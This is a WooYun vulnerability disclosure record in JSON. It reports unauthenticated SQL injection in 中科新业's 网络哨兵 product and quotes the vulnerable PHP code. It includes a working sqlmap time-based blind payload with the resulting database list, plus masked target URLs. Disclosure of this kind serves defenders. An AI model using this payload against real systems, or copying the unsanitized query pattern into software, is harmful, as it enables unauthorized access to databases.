{"id": 69683, "wybug_id": "wooyun-2015-0126992", "wybug_title": "中科新业网络哨兵一处sql注入", "wybug_corp": "中科新业", "wybug_author": "牛肉包子", "wybug_date": "2015-07-17 18:27", "wybug_open_date": "2015-10-15 16:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-17：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向公众公开  简要描述： 无需登录 详细说明：  注入#1看到admin/addswitchmanage.php\n$act = $_REQUEST['act'];if ( $act == \"E\" ){\t\t\t\t$sql = \"SELECT id,switch_ip,switch_type,decode(pass_word,'pd@st#rd') as pass,switch_oid,port_num,description\\r\\n\\t\\t   FROM tab_switch WHERE id = \".$_GET['id'];\t\t\t\t$gDb->query( $sql );\t\t\t\t$gDb->next_record( );\t\t\t\t$id = $gDb->Record['id'];\t\t\t\t$switch_ip = $gDb->Record['switch_ip'];\t\t\t\t$switch_pass = $gDb->Record['pass'];\t\t\t\t$port_num = $gDb->Record['port_num'];\t\t\t\t$switch_des = $gDb->Record['description'];\t\t\t\t$type1 = $gDb->Record['switch_type'];\t\t\t\t$vlan = $vlan = str_replace( \"|\", \"\\r\", $gDb->Record['switch_oid'] );\t\t\t\t$gIpTemp = explode( \".\", $switch_ip );\t\t\t\t$ip1 = $gIpTemp[0];\t\t\t\t$ip2 = $gIpTemp[1];\t\t\t\t$ip3 = $gIpTemp[2];\t\t\t\t$ip4 = $gIpTemp[3];}\n注入#2ucenter/unit/unitinfolang_a.php\nif ( !isset( $_GET['type'] ) ){\t\t\t\t$type = 1;}else{\t\t\t\t$type = $_GET['type'];}$sql = \"SELECT * FROM tab_lang_type WHERE id=\".$type;$gDb2->query( $sql );$gRnum = $gDb2->num_rows( );$gDb2->next_record( );$gid = $_GET['unit_id'];$iI = 0;for ( ;\t$iI < $gRecordCnt;\t++$iI\t){\t\t\t\t$gDb->next_record( );\t\t\t\tif ( $gDb->Record['id'] == $gDb2->Record['id'] )\t\t\t\t{\t\t\t\t\t\t\t\t$color = \"style='color:#FF0000'\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$color = \"\";\t\t\t\t}\t\t\t\t$lang_type .= \"<a href='../main/zkxy.php?gProgramId=unitinfolang&gModuleId=unit&CommonFlag=A&type=\".$gDb->Record['id'].\"&unit_id={gid}'\".$color.\">\".$gDb->Record['type'].\"</a> \";}\n明显的注入   漏洞证明：  \nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: act=E&id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))ToKi)---web application technology: Apacheback-end DBMS: MySQL 5.0.11available databases [9]:[*] `#mysql50#ucenter_08-12-26-17-21-57OURCE`[*] cluster[*] information_schema[*] mysql[*] ucenter[*] ucenter_big_tables[*] ucenter_gbk_bak[*] ucenter_org[*] ucenter_other_tables\n案例\n**.**.**.**/ucenter/admin/addswitchmanage.php?act=E&id=1**.**.**.**/ucenter/admin/addswitchmanage.php?act=E&id=1**.**.**.**/ucenter/admin/addswitchmanage.php?act=E&id=1**.**.**.**/ucenter/admin/addswitchmanage.php?act=E&id=1**.**.**.**/ucenter/admin/addswitchmanage.php?act=E&id=1\n   修复方案：  0.0   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-17 16:22 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}